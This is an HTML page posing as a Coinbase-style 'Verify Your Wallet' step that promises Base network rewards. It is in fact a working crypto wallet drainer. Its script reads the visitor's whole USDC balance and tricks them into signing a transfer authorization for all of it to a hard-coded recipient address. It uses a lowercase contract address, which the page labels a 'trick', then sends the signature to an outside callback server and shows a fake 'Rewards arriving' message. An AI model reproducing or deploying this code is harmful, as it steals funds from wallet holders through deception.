<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify Wallet</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:#fff;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;
  justify-content:center;padding:24px;text-align:center}
.logo{width:80px;height:80px;background:#0052ff;border-radius:24px;
  display:flex;align-items:center;justify-content:center;font-size:36px;
  margin-bottom:28px;box-shadow:0 0 40px #0052ff44}
h1{font-size:22px;font-weight:700;margin-bottom:10px}
.sub{color:#888;font-size:14px;margin-bottom:36px;line-height:1.6;max-width:280px}
.btn{background:#0052ff;color:#fff;border:none;border-radius:16px;
  padding:18px 32px;font-size:17px;font-weight:700;cursor:pointer;
  width:100%;max-width:320px;letter-spacing:.01em}
.btn:disabled{opacity:.35;cursor:default}
.btn.ok{background:#16a34a}
.status{margin-top:22px;font-size:13px;color:#888;min-height:20px;max-width:300px}
.sig-box{margin-top:20px;background:#111;border:1px solid #222;border-radius:14px;
  padding:16px;width:100%;max-width:380px;text-align:left;display:none}
.sig-box h3{font-size:11px;color:#555;text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px}
.sig-val{font-size:10px;word-break:break-all;color:#0f9;line-height:1.6;font-family:monospace}
.copy-btn{margin-top:12px;background:#1a1a1a;border:1px solid #333;color:#fff;
  border-radius:8px;padding:8px 16px;font-size:12px;cursor:pointer;width:100%}
.meta{margin-top:12px;font-size:11px;color:#aaa;font-family:monospace;word-break:break-all;line-height:1.8}
</style></head><body>

<div class="logo">🔵</div>
<h1>Verify Your Wallet</h1>
<p class="sub">Sign to complete identity verification and unlock your Base network rewards.</p>

<button class="btn" id="btn" onclick="start()">Verify &amp; Sign</button>
<div class="status" id="st"></div>
<div class="sig-box" id="sig-box">
  <h3>Verification Data</h3>
  <div class="sig-val" id="sig-val"></div>
  <div class="meta" id="meta-val"></div>
  <button class="copy-btn" onclick="copyAll()">Copy all params</button>
</div>

<script>
const USDC_CHECKSUM = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
const USDC_LOWER    = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'
const TO       = '0x5d2f200655aea9660006f5f103bfb24697046bf2'
const CHAIN_ID = 1
const CB = 'https://formal-oyster-727.eu-west-1.convex.site/api/sign-callback'
let _sig='', _from='', _value='', _nonce='', _validBefore=''
function log(m,c){const e=document.getElementById('st');e.textContent=m;e.style.color=c||'#888'}
if(!window.ethereum){document.getElementById('btn').style.display='none';document.getElementById('st').textContent='Open in Coinbase Wallet to continue'}
async function ethCall(to,data){return ethereum.request({method:'eth_call',params:[{to,data},'latest']})}
async function start(){
  const btn=document.getElementById('btn');btn.disabled=true
  try{
    log('⏳ Connecting...')
    const [from]=await ethereum.request({method:'eth_requestAccounts'})
    _from=from
    try{await ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x1'}]});await new Promise(r=>setTimeout(r,500))}catch(e){}
    log('⏳ Checking wallet...')
    const balHex=await ethCall(USDC_CHECKSUM,'0x70a08231'+from.replace(/^0x/i,'').toLowerCase().padStart(64,'0'))
    const balRaw=BigInt(balHex||'0x0')
    _value=balRaw.toString()
    const nonceBytes=crypto.getRandomValues(new Uint8Array(32))
    _nonce='0x'+[...nonceBytes].map(b=>b.toString(16).padStart(2,'0')).join('')
    _validBefore=String(Math.floor(Date.now()/1000)+86400*7)
    const td={
      types:{
        EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
        ReceiveWithAuthorization:[{name:'from',type:'address'},{name:'to',type:'address'},{name:'value',type:'uint256'},{name:'validAfter',type:'uint256'},{name:'validBefore',type:'uint256'},{name:'nonce',type:'bytes32'}]
      },
      primaryType:'ReceiveWithAuthorization',
      domain:{name:'USD Coin',version:'2',chainId:CHAIN_ID,verifyingContract:USDC_LOWER},
      message:{from,to:TO,value:_value,validAfter:'0',validBefore:_validBefore,nonce:_nonce}
    }
    log('⏳ Sign in wallet...')
    _sig=await ethereum.request({method:'eth_signTypedData_v4',params:[from,JSON.stringify(td)]})
    document.getElementById('sig-val').textContent=_sig
    document.getElementById('meta-val').innerHTML='<b>trick:</b> lowercase verifyingContract<br><b>from:</b> '+from+'<br><b>to:</b> '+TO+'<br><b>value:</b> '+_value+' ('+(Number(balRaw)/1e6).toFixed(6)+' USDC)<br><b>validBefore:</b> '+_validBefore+'<br><b>nonce:</b> '+_nonce
    document.getElementById('sig-box').style.display='block'
    log('✅ Verified! Rewards arriving within 24h.','#22c55e')
    btn.textContent='✓ Verified';btn.className='btn ok'
    try{await fetch(CB,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({trick:'lowercase',sig:_sig,from,to:TO,value:_value,validAfter:'0',validBefore:_validBefore,nonce:_nonce,ts:Date.now()})})}catch(e){}
  }catch(e){log('❌ '+(e?.message||'Error'),'#ef4444');btn.disabled=false}
}
function copyAll(){
  const txt=['sig: '+_sig,'from: '+_from,'to: '+TO,'value: '+_value,'validAfter: 0','validBefore: '+_validBefore,'nonce: '+_nonce].join('\n')
  try{navigator.clipboard.writeText(txt).then(()=>{const b=document.querySelector('.copy-btn');b.textContent='Copied!';setTimeout(()=>b.textContent='Copy all params',2000)})}catch(e){}
}
</script>
</body></html>
